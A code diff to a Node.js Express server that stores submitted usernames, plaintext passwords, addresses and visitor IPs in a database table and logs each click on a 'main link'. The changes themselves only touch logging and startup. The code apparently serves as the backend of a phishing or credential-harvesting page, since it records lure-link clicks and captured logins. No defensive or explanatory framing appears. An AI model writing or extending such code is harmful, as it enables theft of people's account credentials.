@@ -19,7 +19,8 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     address TEXT,
     ip TEXT,
     timestamp TEXT
-)`);
+)`).then(() => console.log("✅ Supabase Connected"))
+   .catch(err => console.error("Table Error:", err.message));
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
@@ -27,14 +28,13 @@ function saveRecord(type, username = null, password = null, address = null, ip =
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
-    console.log(`📍 ${type} | IP: ${ip}`);
 }
 
-// MAIN LINK - This must record immediately
+// Record Page Visit Immediately
 app.get('/', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'Unknown';
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("✅ Someone clicked the main link! IP:", ip);
+    console.log(`📍 Page Visit Recorded | IP: ${ip}`);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
@@ -66,6 +66,6 @@ app.post('/api/clear', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running`);
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
 });
